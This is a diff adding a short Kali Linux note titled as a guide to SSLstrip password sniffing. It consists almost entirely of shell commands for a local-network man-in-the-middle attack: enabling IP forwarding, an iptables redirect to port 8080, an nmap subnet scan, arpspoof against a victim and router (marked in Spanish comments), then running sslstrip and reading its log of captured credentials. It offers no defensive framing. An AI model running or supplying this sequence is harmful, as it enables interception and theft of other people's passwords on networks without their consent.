@@ -1,0 +1,16 @@
+Kali Linux: How To Use SSLstrip - Sniffing Passwords
+
+ifconfig
+netdiscover
+route -n
+
+1. cd /usr/share/sslstrip
+2. echo 1 > /proc/sys/net/ipv4/ip_forward
+3. iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+nmap -sS -0 192.168.2.1/24
+4. arpspoof -i eth0 -t 192.168.2.102 192.168.2.1  #ip de la victima netdiscover  y ip del router
+5. sslstrip -l 8080 
+6. cat sslstrip.log
+7. python sslstrip.py -p -w demo #otra opcion
+
+
